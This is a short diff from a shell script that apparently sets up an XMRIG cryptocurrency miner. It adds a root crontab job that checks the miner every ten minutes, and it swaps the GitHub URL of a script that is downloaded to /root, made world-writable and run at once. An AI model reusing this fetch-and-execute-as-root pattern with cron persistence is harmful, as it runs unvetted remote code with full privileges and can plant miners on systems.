@@ -83,7 +83,7 @@ cat >>/var/spool/cron/crontabs/root<<EOF
 */10 * * * * /root/checkXMRIG.sh > /root/checkxmrig.log
 EOF
 
-wget "https://raw.githubusercontent.com/minhchau91/createproxy/main/kill_miniZeph.sh" --output-document=/root/kill_miniZeph.sh
+wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miniZeph.sh
 chmod 777 /root/kill_miniZeph.sh
 ./kill_miniZeph.sh
 ./danielchau.sh
